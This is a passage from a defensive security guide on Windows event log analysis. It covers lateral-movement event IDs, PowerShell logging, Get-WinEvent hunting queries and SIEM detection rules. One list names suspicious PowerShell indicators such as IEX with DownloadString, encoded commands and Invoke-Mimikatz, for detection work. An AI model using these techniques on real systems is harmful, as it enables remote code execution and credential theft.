        <pre><code># PsExec creates a service on the target
Event ID 4697: Service installed (PSEXESVC)
Event ID 7045: New service installed (System log)

# Correlate with:
Event ID 4624: Logon Type 3 (Network)
Event ID 4688: cmd.exe or powershell.exe with parent svchost.exe</code></pre>

        <h3>WMI-based Attacks</h3>

        <pre><code># WMI process creation leaves these traces:
Event ID 4688: Process created by WmiPrvSE.exe
Event ID 4648: Explicit credentials used

# WMI-Activity log (if enabled):
Microsoft-Windows-WMI-Activity/Operational
Event ID 5857: Provider loaded
Event ID 5861: Temporary event consumer</code></pre>

        <h2 id="powershell">6. PowerShell Analysis</h2>

        <p>PowerShell is heavily used by both administrators and attackers. Proper logging is essential.</p>

        <h3>Enable PowerShell Logging</h3>

        <pre><code># GPO: Computer Configuration ‚Üí Administrative Templates 
#      ‚Üí Windows Components ‚Üí Windows PowerShell

# 1. Module Logging
Turn on Module Logging: Enabled
Module Names: *

# 2. Script Block Logging (CRITICAL!)
Turn on PowerShell Script Block Logging: Enabled
Log script block invocation start/stop events: Enabled

# 3. Transcription (optional, disk intensive)
Turn on PowerShell Transcription: Enabled</code></pre>

        <h3>Key PowerShell Event IDs</h3>

        <table>
            <thead>
                <tr>
                    <th>Event ID</th>
                    <th>Log</th>
                    <th>Description</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="event-id">4103</span></td>
                    <td>PowerShell Operational</td>
                    <td>Module logging (pipeline execution)</td>
                </tr>
                <tr>
                    <td><span class="event-id">4104</span></td>
                    <td>PowerShell Operational</td>
                    <td>Script block logging (full script content)</td>
                </tr>
                <tr>
                    <td><span class="event-id">4105</span></td>
                    <td>PowerShell Operational</td>
                    <td>Script block start</td>
                </tr>
                <tr>
                    <td><span class="event-id">4106</span></td>
                    <td>PowerShell Operational</td>
                    <td>Script block stop</td>
                </tr>
            </tbody>
        </table>

        <h3>Suspicious PowerShell Indicators</h3>

        <pre><code># Look for these in Event ID 4104:
-ExecutionPolicy Bypass
-NoProfile -NonInteractive -WindowStyle Hidden
Invoke-Expression (IEX)
DownloadString, DownloadFile
Net.WebClient
[System.Convert]::FromBase64String
-enc, -encodedcommand
Invoke-Mimikatz, Invoke-Shellcode
Add-Type -TypeDefinition (inline C# compilation)</code></pre>

        <h2 id="queries">7. PowerShell Queries for Analysis</h2>

        <h3>Find Failed Logons</h3>

        <pre><code># Get failed logon attempts in last 24 hours
$startTime = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4625
    StartTime = $startTime
} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.Properties[5].Value
        Domain = $_.Properties[6].Value
        SourceIP = $_.Properties[19].Value
        Status = $_.Properties[7].Value
        SubStatus = $_.Properties[9].Value
    }
} | Format-Table -AutoSize</code></pre>

        <h3>Find RDP Sessions</h3>

        <pre><code># Get RDP sessions (Logon Type 10)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624
} | Where-Object { $_.Properties[8].Value -eq 10 } | 
ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.Properties[5].Value
        SourceIP = $_.Properties[18].Value
        Workstation = $_.Properties[11].Value
    }
} | Format-Table -AutoSize</code></pre>

        <h3>Find New Accounts Created</h3>

        <pre><code># Get new user accounts created
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4720
} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        NewUser = $_.Properties[0].Value
        CreatedBy = $_.Properties[4].Value
    }
} | Format-Table -AutoSize</code></pre>

        <h3>Find Privileged Group Changes</h3>

        <pre><code># Monitor Domain Admins and other privileged groups
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4728,4732,4756
} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        EventID = $_.Id
        MemberAdded = $_.Properties[0].Value
        GroupName = $_.Properties[2].Value
        ChangedBy = $_.Properties[6].Value
    }
} | Format-Table -AutoSize</code></pre>

        <h3>Find Suspicious Processes</h3>

        <pre><code># Find encoded PowerShell execution
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4688
} | Where-Object { 
    $_.Properties[8].Value -match 'powershell|cmd' -and 
    $_.Properties[8].Value -match '-enc|-e\s|base64'
} | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $_.Properties[1].Value
        CommandLine = $_.Properties[8].Value
        ParentProcess = $_.Properties[13].Value
    }
}</code></pre>

        <h2 id="siem">8. SIEM Integration</h2>

        <h3>Windows Event Forwarding (WEF)</h3>

        <p>Centralize logs from all Windows systems to a collector server:</p>

        <pre><code># On Collector server:
wecutil qc

# Create subscription (example for security events)
wecutil cs subscription.xml

# subscription.xml example:
&lt;Subscription xmlns="..."&gt;
    &lt;SubscriptionId&gt;Security-Events&lt;/SubscriptionId&gt;
    &lt;Query&gt;
        &lt;QueryList&gt;
            &lt;Query Path="Security"&gt;
                &lt;Select&gt;*[System[(EventID=4624 or EventID=4625 or 
                EventID=4688 or EventID=4720 or EventID=4728)]]&lt;/Select&gt;
            &lt;/Query&gt;
        &lt;/QueryList&gt;
    &lt;/Query&gt;
&lt;/Subscription&gt;</code></pre>

        <h3>SIEM Detection Rules</h3>

        <pre><code># Splunk - Password Spraying Detection
index=wineventlog EventCode=4625 
| stats count by src_ip, user 
| where count > 5

# Splunk - Encoded PowerShell
index=wineventlog EventCode=4688 
| regex CommandLine="(?i)(powershell|pwsh).*(-e\s|-enc)"

# Elastic - Privileged Group Modification
event.code:(4728 OR 4732 OR 4756) AND 
winlog.event_data.TargetUserName:"Domain Admins"

# MS Sentinel - New Service Installation
SecurityEvent
| where EventID == 4697 or EventID == 7045
| where ServiceFileName !contains "Windows"</code></pre>

        <h2 id="quick-reference">9. Quick Reference Card</h2>

        <div class="quick-ref">
            <div class="quick-ref-card">
                <h4 style="color: var(--accent-red);">üîê Auth Events</h4>
                <ul style="margin-left: 1rem;">
                    <li><code>4624</code> - Logon Success</li>
                    <li><code>4625</code> - Logon Failed</li>
                    <li><code>4648</code> - Explicit Creds</li>
                    <li><code>4672</code> - Special Privs</li>
                </ul>
            </div>
            <div class="quick-ref-card">
                <h4 style="color: var(--accent-orange);">üë§ Account Events</h4>
                <ul style="margin-left: 1rem;">
                    <li><code>4720</code> - User Created</li>
                    <li><code>4724</code> - Password Reset</li>
                    <li><code>4728</code> - Group Member Add</li>
                    <li><code>4732</code> - Local Group Add</li>
                </ul>
            </div>
            <div class="quick-ref-card">
                <h4 style="color: var(--accent-green);">‚öôÔ∏è Process Events</h4>
                <ul style="margin-left: 1rem;">
                    <li><code>4688</code> - Process Created</li>
                    <li><code>4697</code> - Service Installed</li>
                    <li><code>4698</code> - Task Created</li>
                    <li><code>1</code> - Sysmon Process</li>
                </ul>
            </div>
            <div class="quick-ref-card">
                <h4 style="color: var(--accent-blue);">üìú PowerShell</h4>
                <ul style="margin-left: 1rem;">
                    <li><code>4103</code> - Module Logging</li>
                    <li><code>4104</code> - Script Block</li>
                    <li><code>400</code> - Engine Start</li>
                    <li><code>800</code> - Pipeline Exec</li>
                </ul>
            </div>
        </div>

        <div class="success-box">
            <strong><i class="fas fa-check-circle"></i> Next Steps:</strong>
            <ul style="margin-top: 1rem;">
                <li>Install <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
                        style="color: var(--accent-cyan);">Sysmon</a> for enhanced process monitoring</li>
                <li>Configure Windows Event Forwarding for centralized logging</li>
                <li>Build detection rules in your SIEM for the patterns above</li>
                <li>Practice with <a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES"
                        style="color: var(--accent-cyan);">EVTX Attack Samples</a></li>
            </ul>
        </div>

        <div class="info-box">
            <strong><i class="fas fa-link"></i> Related Resources:</strong>
            <ul style="margin-top: 1rem;">
                <li><a href="/guides/active-directory-security-hardening.html" style="color: var(--accent-cyan);">Active
                        Directory Security & Hardening</a></li>
                <li><a href="/guides/siem-log-analysis.html" style="color: var(--accent-cyan);">SIEM Log Analysis for
                        Beginners</a></li>
                <li><a href="/guides/threat-hunting-techniques.html" style="color: var(--accent-cyan);">Threat Hunting
                        Techniques</a></li>
                <li><a href="/guides/incident-response-automation.html" style="color: var(--accent-cyan);">Incident
                        Response Automation</a></li>
            </ul>
        </div>

        <p style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border); color: var(--text-muted);">
            <strong>Author:</strong> TheHGTech Security Team<br>
            <strong>Last Updated:</strong> December 2025<br>
            <strong>Reading Time:</strong> 22 minutes
        </p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const body = document.body;
            if (localStorage.getItem('theme') === 'light') {
                body.classList.add('light-mode');
            }
        });
    </script>

    <!-- Interaction Bar -->
    <div class="interaction-bar">
        <div class="like-section">
            <button class="like-btn" id="likeBtn" onclick="toggleLike()">
                <i class="far fa-heart"></i> <span id="likeText">Like this guide</span>
            </button>
        </div>
        <div class="action-buttons">
            <div class="share-buttons">
                <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter"
                    aria-label="Share on Twitter">
                    <i class="fab fa-twitter"></i>
                </a>
                <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn"
                    aria-label="Share on LinkedIn">
                    <i class="fab fa-linkedin-in"></i>
                </a>
                <button onclick="copyLink()" class="share-btn" title="Copy Link" aria-label="Copy Link">
                    <i class="fas fa-link"></i>
                </button>
            </div>
            <div class="button-separator"></div>
            <button onclick="printArticle()" class="print-btn" title="Print" aria-label="Print">
                <i class="fas fa-print"></i>
            </button>
        </div>
    </div>

    <script src="/interaction-bar.js?v=20251217"></script>
<script src="../ui-enhancements.js?v=20260220" defer></script>
</body>

</html>